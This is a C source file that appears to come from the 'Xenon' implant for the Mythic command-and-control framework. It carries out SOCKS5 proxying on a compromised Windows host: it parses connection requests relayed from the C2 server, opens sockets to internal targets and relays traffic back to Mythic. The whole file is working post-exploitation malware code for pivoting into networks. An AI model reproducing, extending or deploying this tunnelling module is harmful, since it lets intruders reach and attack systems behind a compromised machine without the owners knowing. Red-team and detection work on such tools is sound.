#include "Tasks/Socks.h"

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Utils.h"
#include "Config.h"

#ifdef INCLUDE_CMD_SOCKS

/**
 * @brief This doesnt really do anything.
 *        It just acknowledges the receipt of the socks command.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID Socks(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        PackageComplete(taskUuid, NULL);
        return;
    }

    UINT32 Port = ParserGetInt32(arguments);

    _dbg("[SOCKS] Received socks command for port %d", Port);

    PackageComplete(taskUuid, NULL);

    return;
}


/**
 * @brief Find a SOCKS connection by server_id
 * 
 * @param[in] serverId The server_id to search for
 * @return PSOCKS_CONN Pointer to connection or NULL if not found
 */
PSOCKS_CONN SocksFindConnection(UINT32 serverId)
{
    PSOCKS_CONN current = (PSOCKS_CONN)xenonConfig->SocksConnections;
    
    while (current)
    {
        if (current->ServerId == serverId)
        {
            return current;
        }
        current = current->Next;
    }
    
    return NULL;
}


/**
 * @brief Create a new SOCKS connection to target
 * 
 * @param[in] serverId Mythic's connection identifier
 * @param[in] targetIp Target IP address as string
 * @param[in] targetPort Target port number
 * @return PSOCKS_CONN Pointer to new connection or NULL on failure
 */
PSOCKS_CONN SocksConnect(UINT32 serverId, PCHAR targetIp, UINT16 targetPort)
{
    PSOCKS_CONN conn = NULL;
    SOCKET      sock = INVALID_SOCKET;
    WSADATA     wsaData;
    u_long      mode = 1;  // Non-blocking mode
    DWORD       status = 0;

    _dbg("[SOCKS] Connecting to %s:%d (server_id: %u)", targetIp, targetPort, serverId);

    /* Initialize Winsock if needed */
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        status = WSAGetLastError();
        _err("[SOCKS] WSAStartup failed: %d", status);
        return NULL;
    }

    /* Create socket */
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        status = WSAGetLastError();
        _err("[SOCKS] WSASocketA failed: %d", status);
        return NULL;
    }

    /* Resolve hostname/IP */
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(targetPort);
    
    /* Try to parse as IP address first */
    serverAddr.sin_addr.s_addr = inet_addr(targetIp);
    if (serverAddr.sin_addr.s_addr == INADDR_NONE)
    {
        /* Try DNS resolution */
        struct hostent* host = gethostbyname(targetIp);
        if (host == NULL)
        {
            status = WSAGetLastError();
            _err("[SOCKS] Cannot resolve hostname: %s", targetIp);
            closesocket(sock);
            return NULL;
        }
        memcpy(&serverAddr.sin_addr, host->h_addr_list[0], host->h_length);
    }

    /* Set non-blocking mode BEFORE connect for timeout support */
    if (ioctlsocket(sock, FIONBIO, &mode) == SOCKET_ERROR)
    {
        status = WSAGetLastError();
        _err("[SOCKS] ioctlsocket failed: %d", status);
        closesocket(sock);
        return NULL;
    }

    /* Non-blocking connect - will return immediately with WSAEWOULDBLOCK */
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        status = WSAGetLastError();
        if (status != WSAEWOULDBLOCK)
        {
            _err("[SOCKS] Connect failed immediately: %d", status);
            closesocket(sock);
            return NULL;
        }
        
        /* Connection in progress - use select() to wait with timeout */
        fd_set writeSet, errorSet;
        struct timeval timeout;
        
        FD_ZERO(&writeSet);
        FD_ZERO(&errorSet);
        FD_SET(sock, &writeSet);
        FD_SET(sock, &errorSet);
        
        timeout.tv_sec = SOCKS_CONNECT_TIMEOUT_SEC;
        timeout.tv_usec = 0;
        
        int selectResult = select(0, NULL, &writeSet, &errorSet, &timeout);
        
        if (selectResult == 0)
        {
            /* Timeout - connection took too long */
            _err("[SOCKS] Connect timeout after %d seconds", SOCKS_CONNECT_TIMEOUT_SEC);
            closesocket(sock);
            return NULL;
        }
        else if (selectResult == SOCKET_ERROR)
        {
            status = WSAGetLastError();
            _err("[SOCKS] select() failed: %d", status);
            closesocket(sock);
            return NULL;
        }
        
        /* Check if connection succeeded or failed */
        if (FD_ISSET(sock, &errorSet))
        {
            int error = 0;
            int len = sizeof(error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&error, &len);
            _err("[SOCKS] Connect failed: %d", error);
            closesocket(sock);
            return NULL;
        }
        
        if (!FD_ISSET(sock, &writeSet))
        {
            _err("[SOCKS] Connect failed: socket not writable");
            closesocket(sock);
            return NULL;
        }
        
        /* Double-check for socket errors */
        int error = 0;
        int len = sizeof(error);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&error, &len) == SOCKET_ERROR || error != 0)
        {
            _err("[SOCKS] Connect failed with error: %d", error);
            closesocket(sock);
            return NULL;
        }
    }

    _dbg("[SOCKS] Connected successfully to %s:%d", targetIp, targetPort);

    /* Allocate connection structure */
    conn = (PSOCKS_CONN)LocalAlloc(LPTR, sizeof(SOCKS_CONN));
    if (conn == NULL)
    {
        _err("[SOCKS] Failed to allocate SOCKS_CONN");
        closesocket(sock);
        return NULL;
    }

    conn->ServerId = serverId;
    conn->Socket = sock;
    conn->Connected = TRUE;
    conn->ShouldExit = FALSE;
    conn->Next = NULL;

    /* Add to linked list */
    if (xenonConfig->SocksConnections == NULL)
    {
        xenonConfig->SocksConnections = conn;
    }
    else
    {
        PSOCKS_CONN current = (PSOCKS_CONN)xenonConfig->SocksConnections;
        while (current->Next != NULL)
        {
            current = current->Next;
        }
        current->Next = conn;
    }

    return conn;
}


/**
 * @brief Remove and cleanup a SOCKS connection by server_id
 * 
 * @param[in] serverId The server_id of the connection to remove
 * @return BOOL TRUE if removed, FALSE if not found
 */
BOOL SocksRemove(UINT32 serverId)
{
    PSOCKS_CONN current = (PSOCKS_CONN)xenonConfig->SocksConnections;
    PSOCKS_CONN prev = NULL;

    while (current)
    {
        if (current->ServerId == serverId)
        {
            _dbg("[SOCKS] Removing connection server_id: %u", serverId);

            /* Close socket */
            if (current->Socket != INVALID_SOCKET)
            {
                shutdown(current->Socket, SD_BOTH);
                closesocket(current->Socket);
            }

            /* Update linked list */
            if (prev == NULL)
            {
                xenonConfig->SocksConnections = current->Next;
            }
            else
            {
                prev->Next = current->Next;
            }

            LocalFree(current);
            return TRUE;
        }

        prev = current;
        current = current->Next;
    }

    return FALSE;
}


/**
 * @brief Send SOCKS response data to Mythic
 * 
 * @param[in] serverId The server_id for this response
 * @param[in] data The data to send (can be NULL)
 * @param[in] dataLen Length of data
 * @param[in] exitFlag Whether connection should be closed
 */
VOID SocksSendResponse(UINT32 serverId, PBYTE data, UINT32 dataLen, BOOL exitFlag)
{
    PPackage package = PackageInit(NULL, FALSE);
    
    PackageAddByte(package, SOCKS_DATA);        // BYTE:   Message type
    PackageAddInt32(package, serverId);         // UINT32: server_id
    PackageAddInt32(package, dataLen);          // UINT32: data length
    if (data != NULL && dataLen > 0)
    {
        PackageAddBytes(package, data, dataLen, FALSE);  // BYTES: data
    }
    PackageAddByte(package, exitFlag ? 0x01 : 0x00);     // BYTE: exit flag

    PackageQueue(package);

    _dbg("[SOCKS] Queued response: server_id=%u, len=%u, exit=%d", serverId, dataLen, exitFlag);
}


/**
 * @brief Process incoming SOCKS data from Mythic
 *        This handles the binary SOCKS messages
 * 
 * @param[in] parser Parser containing SOCKS data messages
 */
VOID SocksProcessData(PPARSER parser)
{
    if (parser == NULL || parser->Buffer == NULL)
        return;

    /* First read parameter count (matches pack_parameters format) */
    UINT32 numParams = ParserGetInt32(parser);
    if (numParams == 0)
        return;

    /* Parse: server_id, data_length, data, exit_flag */
    SIZE_T dataLen  = 0;
    UINT32 serverId = ParserGetInt32(parser);
    PBYTE  data     = ParserGetBytes(parser, &dataLen);
    BYTE   exitFlag = ParserGetByte(parser);

    _dbg("[SOCKS] Processing data: server_id=%u, len=%zu, exit=%d", serverId, dataLen, exitFlag);

    /* Find existing connection */
    PSOCKS_CONN conn = SocksFindConnection(serverId);

    /* If no existing connection and we have data, this is a new connection request */
    if (conn == NULL)
    {
        /* Mythic sends SOCKS5 format:
         * Byte 0: Version (0x05)
         * Byte 1: Command (0x01 = CONNECT)
         * Byte 2: Reserved (0x00)
         * Byte 3: Address type (0x01 = IPv4, 0x03 = Domain, 0x04 = IPv6)
         * Then: Address + Port (2 bytes big-endian)
         * Minimum for IPv4: 4 (header) + 4 (IP) + 2 (port) = 10 bytes
        
        /* SOCKS5 error reply template: VER(1) REP(1) RSV(1) ATYP(1) ADDR(4) PORT(2) */
        BYTE errorReply[10] = {0x05, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        
        /* SOCKS5 header is 10 bytes */
        if (dataLen < 10)
        {
            _err("[SOCKS] New connection but insufficient data for target info (got %zu, need 10)", dataLen);
            errorReply[1] = 0x01;  /* General SOCKS server failure */
            SocksSendResponse(serverId, errorReply, sizeof(errorReply), TRUE);
            return;
        }

        /* Parse SOCKS5 header */
        BYTE addrType = data[3];
        PBYTE targetData = data + 4;  // Skip version, command, reserved, address type
        
        PCHAR targetIp = NULL;
        UINT16 targetPort = 0;
        UINT32 headerLen = 0;
        char ipBuffer[64] = {0};
        
        if (addrType == 0x01)  // IPv4
        {
            struct in_addr ipAddr;
            memcpy(&ipAddr, targetData, 4);
            targetIp = inet_ntoa(ipAddr);
            targetPort = ntohs(*(UINT16*)(targetData + 4));
            headerLen = 4 + 4 + 2;  // header + IPv4 + port
        }
        else if (addrType == 0x03)  // Domain name
        {
            BYTE domainLen = targetData[0];
            if (dataLen < (size_t)(4 + 1 + domainLen + 2))
            {
                _err("[SOCKS] Insufficient data for domain name");
                errorReply[1] = 0x01;  // General SOCKS server failure
                SocksSendResponse(serverId, errorReply, sizeof(errorReply), TRUE);
                return;
            }
            memcpy(ipBuffer, targetData + 1, domainLen);
            ipBuffer[domainLen] = '\0';
            targetIp = ipBuffer;
            targetPort = ntohs(*(UINT16*)(targetData + 1 + domainLen));
            headerLen = 4 + 1 + domainLen + 2;  // header + len byte + domain + port
        }
        else if (addrType == 0x04)  // IPv6
        {
            _err("[SOCKS] IPv6 not supported");
            errorReply[1] = 0x08;  // Address type not supported
            SocksSendResponse(serverId, errorReply, sizeof(errorReply), TRUE);
            return;
        }
        else
        {
            _err("[SOCKS] Unknown address type: 0x%02X", addrType);
            errorReply[1] = 0x08;  // Address type not supported
            SocksSendResponse(serverId, errorReply, sizeof(errorReply), TRUE);
            return;
        }

        _dbg("[SOCKS] New connection request to %s:%d", targetIp, targetPort);

        /* Create connection */
        conn = SocksConnect(serverId, targetIp, targetPort);
        if (conn == NULL)
        {
            _err("[SOCKS] Failed to connect to target");
            /* SOCKS5 failure reply format: VER(1) REP(1) RSV(1) ATYP(1) ADDR(4) PORT(2) */
            BYTE failReply[10] = {0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            /* 0x05 = Connection refused */
            SocksSendResponse(serverId, failReply, sizeof(failReply), TRUE);
            return;
        }

        /* Send SOCKS5 connection success reply
        /* Format: VER(1) REP(1) RSV(1) ATYP(1) ADDR(4) PORT(2) */
        BYTE successReply[10] = {0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        /* 0x00 = Success */
        SocksSendResponse(serverId, successReply, sizeof(successReply), FALSE);
        _dbg("[SOCKS] Sent SOCKS5 success reply for server_id=%u", serverId);

        /* If there's additional data after the header, send it */
        if (dataLen > headerLen)
        {
            PBYTE remainingData = data + headerLen;
            UINT32 remainingLen = (UINT32)(dataLen - headerLen);
            
            int bytesSent = send(conn->Socket, (char*)remainingData, remainingLen, 0);
            if (bytesSent == SOCKET_ERROR)
            {
                DWORD err = WSAGetLastError();
                if (err != WSAEWOULDBLOCK)
                {
                    _err("[SOCKS] Send failed: %d", err);
                    SocksSendResponse(serverId, NULL, 0, TRUE);
                    SocksRemove(serverId);
                    return;
                }
            }
            else
            {
                _dbg("[SOCKS] Sent %d initial bytes to target", bytesSent);
            }
        }
    }
    else
    {
        /* Existing connection - forward data */
        if (dataLen > 0)
        {
            int bytesSent = send(conn->Socket, (char*)data, (int)dataLen, 0);
            if (bytesSent == SOCKET_ERROR)
            {
                DWORD err = WSAGetLastError();
                if (err != WSAEWOULDBLOCK)
                {
                    _err("[SOCKS] Send to existing connection failed: %d", err);
                    SocksSendResponse(serverId, NULL, 0, TRUE);
                    SocksRemove(serverId);
                    return;
                }
            }
            else
            {
                _dbg("[SOCKS] Forwarded %d bytes to target", bytesSent);
            }
        }
    }

    /* Handle exit flag */
    if ( exitFlag )
    {
        _dbg("[SOCKS] Exit flag set, closing connection server_id=%u", serverId);
        SocksSendResponse(serverId, NULL, 0, TRUE);
        SocksRemove(serverId);
    }
}


/**
 * @brief Push outbound SOCKS data to Mythic
 *        Called from TaskRoutine() to read from all active SOCKS connections
 *        and queue responses for any data received.
 */
VOID SocksPush()
{
    PSOCKS_CONN current = (PSOCKS_CONN)xenonConfig->SocksConnections;
    PSOCKS_CONN prev = NULL;
    BYTE buffer[SOCKS_BUFFER_SIZE];
    UINT32 numReads = 0;

    while ( current != NULL )
    {
        PSOCKS_CONN next = current->Next;
        BOOL shouldRemove = FALSE;

        /* Don't exceed max reads per loop */
        if ( numReads >= MAX_SOCKS_READS_PER_LOOP )
            break;

        if ( current->Socket == INVALID_SOCKET || !current->Connected )
        {
            shouldRemove = TRUE;
        }
        else
        {
            /* Check if socket has data available */
            u_long bytesAvailable = 0;
            if ( ioctlsocket(current->Socket, FIONREAD, &bytesAvailable) == SOCKET_ERROR )
            {
                DWORD err = WSAGetLastError();
                _err("[SOCKS] ioctlsocket FIONREAD failed: %d", err);
                SocksSendResponse(current->ServerId, NULL, 0, TRUE);
                shouldRemove = TRUE;
            }
            else if ( bytesAvailable > 0 )
            {
                /* Read available data */
                int bytesRead = recv(current->Socket, (char*)buffer, sizeof(buffer), 0);
                
                if ( bytesRead > 0 )
                {
                    _dbg("[SOCKS] Received %d bytes from target (server_id=%u)", bytesRead, current->ServerId);
                    SocksSendResponse(current->ServerId, buffer, bytesRead, FALSE);
                    numReads++;
                }
                else if ( bytesRead == 0 )
                {
                    /* Connection closed gracefully */
                    _dbg("[SOCKS] Connection closed by target (server_id=%u)", current->ServerId);
                    SocksSendResponse(current->ServerId, NULL, 0, TRUE);
                    shouldRemove = TRUE;
                }
                else
                {
                    DWORD err = WSAGetLastError();
                    if ( err != WSAEWOULDBLOCK )
                    {
                        _err("[SOCKS] recv failed: %d (server_id=%u)", err, current->ServerId);
                        SocksSendResponse(current->ServerId, NULL, 0, TRUE);
                        shouldRemove = TRUE;
                    }
                }
            }
            /* Also check if connection is still valid by checking for socket errors */
            else
            {
                /* Check socket state */
                int error = 0;
                int len = sizeof(error);
                if (getsockopt(current->Socket, SOL_SOCKET, SO_ERROR, (char*)&error, &len) == SOCKET_ERROR || error != 0)
                {
                    _dbg("[SOCKS] Socket error detected (server_id=%u)", current->ServerId);
                    SocksSendResponse(current->ServerId, NULL, 0, TRUE);
                    shouldRemove = TRUE;
                }
            }
        }

        if ( shouldRemove )
        {
            UINT32 serverId = current->ServerId;
            
            /* Close socket */
            if (current->Socket != INVALID_SOCKET)
            {
                shutdown(current->Socket, SD_BOTH);
                closesocket(current->Socket);
            }

            /* Update linked list */
            if (prev == NULL)
            {
                xenonConfig->SocksConnections = next;
            }
            else
            {
                prev->Next = next;
            }

            LocalFree(current);
            _dbg("[SOCKS] Removed connection server_id=%u", serverId);
        }
        else
        {
            prev = current;
        }

        current = next;
    }
}

#endif  // INCLUDE_CMD_SOCKS
